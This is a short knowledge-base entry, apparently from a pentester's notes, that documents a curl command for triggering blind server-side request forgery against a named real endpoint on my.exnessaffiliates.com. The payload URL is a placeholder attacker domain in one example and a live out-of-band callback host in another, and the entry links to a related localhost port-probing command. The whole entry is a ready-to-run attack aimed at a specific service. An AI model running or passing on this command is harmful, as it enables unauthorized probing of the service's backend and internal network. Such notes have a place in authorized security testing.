---
id: cmd-exness-post-external
data: >-
  curl -X POST
  https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H
  "Content-Type: application/json" -d
  '{"data":{"url":"https://attacker-domain.tld"}}'
tags:
  - ssrf
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.633Z'
verified: false
validated: true
submitted: true
---
# post-probe-external-url

## Command

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H "Content-Type: application/json" -d '{"data":{"url":"https://attacker-domain.tld"}}'
```

## Description

Triggers blind SSRF by posting an external URL to the probe endpoint, causing backend to fetch it.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | JSON payload with data.url | Yes |
| `--url` | Replace with attacker domain | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H "Content-Type: application/json" -d '{"data":{"url":"https://sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com"}}'
```

### Advanced Usage

Add `-v` for verbose output.

## Expected Output

Generic JSON response; success via OAST logs showing backend request.

## Related

- [[commands/post-probe-localhost-port]]
- [[procedures/Confirm-Blind-SSRF-with-External-Domain]]
